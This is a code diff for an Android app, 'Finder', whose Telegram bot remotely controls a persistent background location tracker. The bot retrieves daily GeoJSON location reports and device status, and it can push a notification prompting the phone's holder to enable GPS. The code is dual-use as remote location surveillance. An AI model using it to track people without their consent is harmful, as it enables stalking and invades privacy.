@@ -4,8 +4,12 @@ using System.Linq;
 using System.Net.Http;
 using System.Threading;
 using System.Threading.Tasks;
+using Android.App;
 using Android.Content;
+using Android.Locations;
+using Android.OS;
 using Android.Preferences;
+using AndroidX.Core.App;
 using Finder.Droid.Services;
 using Finder.Models;
 using Newtonsoft.Json;
@@ -13,21 +17,18 @@ using Xamarin.Essentials;
 
 namespace Finder.Droid.Managers
 {
-    /// <summary>
-    /// Polls Telegram for bot commands and executes them.
-    /// Supported commands: /interval, /status, /start, /stop,
-    ///   /restart, /token, /chatid, /report, /today,
-    ///   /yesterday, /files, /cleanup, /cmd
-    /// </summary>
     public class TelegramCommandHandler
     {
-        // Cooldown durations to prevent command spam
         private static DateTime _lastIntervalUpdate = DateTime.MinValue;
         private static DateTime _lastStartupMessage = DateTime.MinValue;
         private static DateTime _lastRestartCommand = DateTime.MinValue;
+
         private const int INTERVAL_COOLDOWN_S = 30;
         private const int STARTUP_COOLDOWN_S = 60;
         private const int RESTART_COOLDOWN_S = 120;
+
+        private const string GPS_ALERT_CHANNEL_ID = "finder_gps_alert_channel";
+        private const int GPS_ALERT_NOTIFICATION_ID = 2001;
 
         private readonly string _settingsFilePath;
         private readonly Context _context;
@@ -44,18 +45,10 @@ namespace Finder.Droid.Managers
                 "secure_settings.json");
             _httpClient = new HttpClient { Timeout = TimeSpan.FromSeconds(15) };
             _geoJsonManager = new GeoJsonManager(context);
+
+            CreateGpsAlertNotificationChannel();
         }
 
-        // ── Start / Stop ───────────────────────────────────────────────────
-
-        /// <summary>
-        /// Starts the Telegram command polling loop.
-        /// </summary>
-        /// <param name="sendStartupMessage">
-        /// True only when the user explicitly pressed "Start Tracking" in the UI.
-        /// Sends the "🤖 Finder service started" Telegram message.
-        /// False for all auto-restarts (boot, crash, watchdog, task-swipe).
-        /// </param>
         public void Start(bool sendStartupMessage = false)
         {
             try
@@ -73,7 +66,6 @@ namespace Finder.Droid.Managers
 
                     if (suppress)
                     {
-                        // Clear the flag set by /restart to avoid a duplicate message.
                         var editor = prefs.Edit();
                         editor.PutBoolean("suppress_next_startup_message", false);
                         editor.Apply();
@@ -84,13 +76,14 @@ namespace Finder.Droid.Managers
                         _ = Task.Run(async () =>
                         {
                             await Task.Delay(2000);
-                            await SendTelegramMessageAsync(settings.BotToken, settings.ChatId,
+                            await SendTelegramMessageAsync(
+                                settings.BotToken, settings.ChatId,
                                 "🤖 Finder service started");
                         });
                     }
                 }
             }
-            catch { /* Silent fail */ }
+            catch { }
         }
 
         public void Stop()
@@ -98,8 +91,6 @@ namespace Finder.Droid.Managers
             _pollTimer?.Dispose();
             _pollTimer = null;
         }
-
-        // ── Polling ────────────────────────────────────────────────────────
 
         private async void PollForCommands(object state)
         {
@@ -121,7 +112,6 @@ namespace Finder.Droid.Managers
                     if (update.UpdateId > _lastUpdateId)
                         _lastUpdateId = update.UpdateId;
 
-                    // Only process messages from the configured chat
                     if (update.Message?.Chat?.Id.ToString() != settings.ChatId) continue;
 
                     string text = update.Message?.Text;
@@ -129,10 +119,8 @@ namespace Finder.Droid.Managers
                         await ProcessCommandAsync(text, settings);
                 }
             }
-            catch { /* Silent fail */ }
+            catch { }
         }
-
-        // ── Command dispatch ───────────────────────────────────────────────
 
         private async Task ProcessCommandAsync(string command, AppSettings currentSettings)
         {
@@ -175,12 +163,12 @@ namespace Finder.Droid.Managers
                     case "/status":
                         var files = _geoJsonManager.GetAvailableDataFiles();
                         response = $"📍 Status\n" +
-                                   $"Tracking: {(IsServiceRunning() ? "✅ Active" : "❌ Stopped")}\n" +
-                                   $"Token: {MaskToken(currentSettings.BotToken)}\n" +
-                                   $"Chat ID: {currentSettings.ChatId}\n" +
-                                   $"Interval: {currentSettings.Interval} ms\n" +
-                                   $"Data files: {files.Count}\n" +
-                                   $"Device time: {DateTime.Now:yyyy-MM-dd HH:mm:ss}";
+                                    $"Tracking: {(IsServiceRunning() ? "✅ Active" : "❌ Stopped")}\n" +
+                                    $"Token: {MaskToken(currentSettings.BotToken)}\n" +
+                                    $"Chat ID: {currentSettings.ChatId}\n" +
+                                    $"Interval: {currentSettings.Interval} ms\n" +
+                                    $"Data files: {files.Count}\n" +
+                                    $"Device time: {DateTime.Now:yyyy-MM-dd HH:mm:ss}";
                         break;
 
                     case "/start":
@@ -201,24 +189,17 @@ namespace Finder.Droid.Managers
                             response = $"⏳ Please wait {remaining}s before restarting again.";
                             break;
                         }
-
                         _lastRestartCommand = DateTime.Now;
-                        await SendTelegramMessageAsync(currentSettings.BotToken,
-                            currentSettings.ChatId, "🔄 Restarting service…");
 
-                        // Suppress the startup message on the next service start
-                        // because the restart notification above already informed the user.
-                        var prefs = PreferenceManager.GetDefaultSharedPreferences(_context);
-                        var editor = prefs.Edit();
-                        editor.PutBoolean("suppress_next_startup_message", true);
-                        editor.Apply();
+                        var suppressPrefs = PreferenceManager.GetDefaultSharedPreferences(_context);
+                        var suppressEditor = suppressPrefs.Edit();
+                        suppressEditor.PutBoolean("suppress_next_startup_message", true);
+                        suppressEditor.Apply();
 
-                        Stop();
                         StopService();
                         await Task.Delay(2000);
                         StartService();
-
-                        response = "✅ Service restarted successfully";
+                        response = "🔄 Service restarted";
                         break;
 
                     case "/token":
@@ -226,10 +207,12 @@ namespace Finder.Droid.Managers
                         {
                             currentSettings.BotToken = param;
                             SaveSettings(currentSettings);
-                            await SecureStorage.SetAsync("bot_token", param);
-                            response = "🔑 Bot token updated. Restart tracking to apply.";
+                            response = $"🔑 Token updated: {MaskToken(param)}";
                         }
-                        else response = "❌ Usage: /token [your_bot_token]";
+                        else
+                        {
+                            response = "❌ Usage: /token [your_bot_token]";
+                        }
                         break;
 
                     case "/chatid":
@@ -237,49 +220,52 @@ namespace Finder.Droid.Managers
                         {
                             currentSettings.ChatId = param;
                             SaveSettings(currentSettings);
-                            await SecureStorage.SetAsync("chat_id", param);
-                            response = "💬 Chat ID updated. Restart tracking to apply.";
+                            response = $"💬 Chat ID updated: {param}";
                         }
-                        else response = "❌ Usage: /chatid [your_chat_id]";
+                        else
+                        {
+                            response = "❌ Usage: /chatid [your_chat_id]";
+                        }
+                        break;
+
+                    case "/today":
+                        await SendGeoJsonReport(DateTime.Today, currentSettings);
+                        response = null;
+                        break;
+
+                    case "/yesterday":
+                        await SendGeoJsonReport(DateTime.Today.AddDays(-1), currentSettings);
+                        response = null;
                         break;
 
                     case "/report":
                         if (!string.IsNullOrEmpty(param) &&
-                            DateTime.TryParse(param, out DateTime rDate))
+                            DateTime.TryParseExact(param, "yyyy-MM-dd",
+                                null,
+                                System.Globalization.DateTimeStyles.None,
+                                out DateTime reportDate))
                         {
-                            await SendGeoJsonReportAsync(rDate, currentSettings);
-                            return;
-                        }
-                        else response = "❌ Usage: /report YYYY-MM-DD";
-                        break;
-
-                    case "/today":
-                        await SendGeoJsonReportAsync(DateTime.Today, currentSettings);
-                        return;
-
-                    case "/yesterday":
-                        await SendGeoJsonReportAsync(DateTime.Today.AddDays(-1), currentSettings);
-                        return;
-
-                    case "/files":
-                        var avail = _geoJsonManager.GetAvailableDataFiles();
-                        if (avail.Count == 0)
-                        {
-                            response = "📁 No data files found yet.";
+                            await SendGeoJsonReport(reportDate, currentSettings);
+                            response = null;
                         }
                         else
                         {
-                            response = $"📁 {avail.Count} file(s):\n\n";
-                            foreach (var f in avail.Take(10))
-                            {
-                                string datePart = Path.GetFileNameWithoutExtension(f);
-                                if (datePart.StartsWith("locations_"))
-                                    datePart = datePart.Substring(10);
-                                response += $"📄 {datePart}\n";
-                            }
-                            if (avail.Count > 10)
-                                response += $"… and {avail.Count - 10} more";
-                            response += "\n\nUse /report YYYY-MM-DD to retrieve a file.";
+                            response = "❌ Usage: /report YYYY-MM-DD";
+                        }
+                        break;
+
+                    case "/files":
+                        var dataFiles = _geoJsonManager.GetAvailableDataFiles();
+                        if (dataFiles.Count == 0)
+                        {
+                            response = "📂 No data files found.";
+                        }
+                        else
+                        {
+                            response = $"📂 Data files ({dataFiles.Count}):\n" +
+                                       string.Join("\n", dataFiles.Take(20));
+                            if (dataFiles.Count > 20)
+                                response += $"\n…and {dataFiles.Count - 20} more";
                         }
                         break;
 
@@ -291,9 +277,42 @@ namespace Finder.Droid.Managers
                         response = $"🧹 Cleanup done · Removed {before - after} files older than {keepDays} days";
                         break;
 
+                    case "/gpsstatus":
+                        bool gpsOn = IsGpsEnabled();
+                        bool svcRunning = IsServiceRunning();
+                        int battery = GetBatteryLevel();
+
+                        response = "📡 *GPS Status*\n" +
+                                   $"GPS Provider: {(gpsOn ? "✅ Enabled" : "❌ Disabled")}\n" +
+                                   $"Tracking Service: {(svcRunning ? "✅ Running" : "⏹ Stopped")}\n" +
+                                   $"Battery: {(battery >= 0 ? $"{battery}%" : "Unknown")}\n" +
+                                   $"Time: {DateTime.Now:HH:mm:ss}";
+
+                        if (!gpsOn)
+                            response += "\n\n💡 Send /enablelocation to request GPS activation.";
+                        break;
+
+                    case "/enablelocation":
+                        bool isAlreadyOn = IsGpsEnabled();
+
+                        if (isAlreadyOn)
+                        {
+                            response = "✅ GPS is already enabled on this device.";
+                        }
+                        else
+                        {
+                            ShowEnableLocationNotification();
+                            response = "📲 *Action required on the device*\n\n" +
+                                       "A notification has been sent to the phone.\n" +
+                                       "Tap it to open Location Settings and enable GPS.\n\n" +
+                                       "⚠️ Android does not allow apps to silently enable GPS — " +
+                                       "one tap by the user is required.";
+                        }
+                        break;
+
                     case "/cmd":
                     default:
-                        response = "📋 Available commands:\n" +
+                        response = "📋 *Available commands:*\n" +
                                    "/interval [ms] — Set update interval\n" +
                                    "/status — Current status\n" +
                                    "/start — Start tracking\n" +
@@ -305,19 +324,109 @@ namespace Finder.Droid.Managers
                                    "/yesterday — Yesterday's report\n" +
                                    "/report YYYY-MM-DD — Specific date report\n" +
                                    "/files — List data files\n" +
-                                   "/cleanup [days] — Delete old files";
+                                   "/cleanup [days] — Delete old files\n" +
+                                   "/gpsstatus — Check if GPS is on or off\n" +
+                                   "/enablelocation — Send notification to enable GPS";
                         break;
                 }
 
-                await SendTelegramMessageAsync(currentSettings.BotToken,
-                    currentSettings.ChatId, response);
+                if (response != null)
+                    await SendTelegramMessageAsync(
+                        currentSettings.BotToken, currentSettings.ChatId, response);
             }
-            catch { /* Silent fail */ }
+            catch { }
         }
 
-        // ── GeoJSON report sender ──────────────────────────────────────────
+        private bool IsGpsEnabled()
+        {
+            try
+            {
+                var locationManager =
+                    (LocationManager)_context.GetSystemService(Context.LocationService);
+                return locationManager != null &&
+                       locationManager.IsProviderEnabled(LocationManager.GpsProvider);
+            }
+            catch
+            {
+                return false;
+            }
+        }
 
-        private async Task SendGeoJsonReportAsync(DateTime date, AppSettings settings)
+        private int GetBatteryLevel()
+        {
+            try
+            {
+                var filter = new IntentFilter(Intent.ActionBatteryChanged);
+                var batteryStatus = _context.RegisterReceiver(null, filter);
+                int level = batteryStatus?.GetIntExtra(BatteryManager.ExtraLevel, -1) ?? -1;
+                int scale = batteryStatus?.GetIntExtra(BatteryManager.ExtraScale, -1) ?? -1;
+                if (level < 0 || scale <= 0) return -1;
+                return (int)((level / (float)scale) * 100);
+            }
+            catch
+            {
+                return -1;
+            }
+        }
+
+        private void ShowEnableLocationNotification()
+        {
+            try
+            {
+                var settingsIntent = new Intent(
+                    Android.Provider.Settings.ActionLocationSourceSettings);
+                settingsIntent.SetFlags(ActivityFlags.NewTask | ActivityFlags.ClearTop);
+
+                var pendingFlags = Build.VERSION.SdkInt >= BuildVersionCodes.M
+                    ? PendingIntentFlags.UpdateCurrent | PendingIntentFlags.Immutable
+                    : PendingIntentFlags.UpdateCurrent;
+
+                var pendingIntent = PendingIntent.GetActivity(
+                    _context, GPS_ALERT_NOTIFICATION_ID, settingsIntent, pendingFlags);
+
+                var notification = new NotificationCompat.Builder(_context, GPS_ALERT_CHANNEL_ID)
+                    .SetContentTitle("📍 Enable GPS — Finder")
+                    .SetContentText("Tap here to open Location Settings and turn on GPS.")
+                    .SetStyle(new NotificationCompat.BigTextStyle()
+                        .BigText("Finder needs GPS to track your location.\n" +
+                                 "Tap this notification to open Location Settings " +
+                                 "and enable GPS with one tap."))
+                    .SetSmallIcon(Android.Resource.Drawable.IcDialogMap)
+                    .SetContentIntent(pendingIntent)
+                    .SetAutoCancel(true)
+                    .SetPriority(NotificationCompat.PriorityHigh)
+                    .Build();
+
+                NotificationManagerCompat
+                    .From(_context)
+                    .Notify(GPS_ALERT_NOTIFICATION_ID, notification);
+            }
+            catch { }
+        }
+
+        private void CreateGpsAlertNotificationChannel()
+        {
+            if (Build.VERSION.SdkInt < BuildVersionCodes.O) return;
+
+            try
+            {
+                var channel = new NotificationChannel(
+                    GPS_ALERT_CHANNEL_ID,
+                    "Finder GPS Alerts",
+                    NotificationImportance.High)
+                {
+                    Description = "Alerts sent when GPS needs to be enabled remotely."
+                };
+
+                channel.EnableVibration(true);
+
+                ((NotificationManager)_context.GetSystemService(Context.NotificationService))
+                    ?.CreateNotificationChannel(channel);
+            }
+            catch { }
+        }
+
+        private async Task SendGeoJsonReport(DateTime date, AppSettings settings)
         {
             try
             {
@@ -326,42 +435,25 @@ namespace Finder.Droid.Managers
                 if (string.IsNullOrEmpty(geoJson))
                 {
                     await SendTelegramMessageAsync(settings.BotToken, settings.ChatId,
-                        $"📊 No data for {date:yyyy-MM-dd}");
+                        $"📭 No data found for {date:yyyy-MM-dd}");
                     return;
                 }
 
-                var collection = JsonConvert.DeserializeObject<GeoJsonFeatureCollection>(geoJson);
-                string summary = $"📊 Report: {date:yyyy-MM-dd}\n" +
-                                 $"Points: {collection.Metadata.TotalPoints}\n" +
-                                 $"Distance: {collection.Metadata.DistanceTraveledKm:F2} km\n" +
-                                 $"Duration: {collection.Metadata.TrackingDurationHours:F1} h";
+                string tempPath = Path.Combine(
+                    Environment.GetFolderPath(Environment.SpecialFolder.Personal),
+                    $"report_{date:yyyy-MM-dd}.geojson");
 
-                await SendTelegramMessageAsync(settings.BotToken, settings.ChatId, summary);
+                File.WriteAllText(tempPath, geoJson);
 
-                string tempFile = Path.Combine(
-                    Path.GetTempPath(),
-                    $"finder_report_{date:yyyy-MM-dd}.geojson");
-                File.WriteAllText(tempFile, geoJson);
-                await SendFileToTelegramAsync(tempFile,
-                    $"GeoJSON · {date:yyyy-MM-dd}", settings);
+                string caption = $"📍 Location report for {date:yyyy-MM-dd}";
 
-                if (File.Exists(tempFile)) File.Delete(tempFile);
-            }
-            catch { /* Silent fail */ }
-        }
-
-        private async Task SendFileToTelegramAsync(
-            string path, string caption, AppSettings settings)
-        {
-            try
-            {
                 using (var form = new MultipartFormDataContent())
                 {
-                    var bytes = File.ReadAllBytes(path);
+                    var bytes = File.ReadAllBytes(tempPath);
                     var content = new ByteArrayContent(bytes);
                     content.Headers.ContentType =
                         new System.Net.Http.Headers.MediaTypeHeaderValue("application/geo+json");
-                    form.Add(content, "document", Path.GetFileName(path));
+                    form.Add(content, "document", Path.GetFileName(tempPath));
                     form.Add(new StringContent(settings.ChatId), "chat_id");
                     form.Add(new StringContent(caption), "caption");
 
@@ -369,10 +461,8 @@ namespace Finder.Droid.Managers
                         $"https://api.telegram.org/bot{settings.BotToken}/sendDocument", form);
                 }
             }
-            catch { /* Silent fail */ }
+            catch { }
         }
-
-        // ── Telegram messaging ─────────────────────────────────────────────
 
         private async Task SendTelegramMessageAsync(string token, string chatId, string message)
         {
@@ -384,10 +474,8 @@ namespace Finder.Droid.Managers
                              $"&text={Uri.EscapeDataString(message)}&parse_mode=Markdown";
                 await _httpClient.GetStringAsync(url);
             }
-            catch { /* Silent fail */ }
+            catch { }
         }
-
-        // ── Service control ────────────────────────────────────────────────
 
         private bool IsServiceRunning()
         {
@@ -400,7 +488,7 @@ namespace Finder.Droid.Managers
             try
             {
                 var intent = new Intent(_context, typeof(BackgroundLocationService));
-                if (Android.OS.Build.VERSION.SdkInt >= Android.OS.BuildVersionCodes.O)
+                if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
                     _context.StartForegroundService(intent);
                 else
                     _context.StartService(intent);
@@ -410,7 +498,7 @@ namespace Finder.Droid.Managers
                 editor.PutBoolean("is_tracking_service_running", true);
                 editor.Apply();
             }
-            catch { /* Silent fail */ }
+            catch { }
         }
 
         private void StopService()
@@ -431,10 +519,8 @@ namespace Finder.Droid.Managers
                     BackgroundLocationService.IsStoppingByUserRequest = false;
                 });
             }
-            catch { /* Silent fail */ }
+            catch { }
         }
-
-        // ── Settings helpers ───────────────────────────────────────────────
 
         private AppSettings LoadSettings()
         {
@@ -444,14 +530,17 @@ namespace Finder.Droid.Managers
                     return JsonConvert.DeserializeObject<AppSettings>(
                         File.ReadAllText(_settingsFilePath)) ?? new AppSettings();
             }
-            catch { /* Silent fail */ }
+            catch { }
             return new AppSettings();
         }
 
         private void SaveSettings(AppSettings settings)
         {
-            try { File.WriteAllText(_settingsFilePath, JsonConvert.SerializeObject(settings)); }
-            catch { /* Silent fail */ }
+            try
+            {
+                File.WriteAllText(_settingsFilePath, JsonConvert.SerializeObject(settings));
+            }
+            catch { }
         }
 
         private string MaskToken(string token)
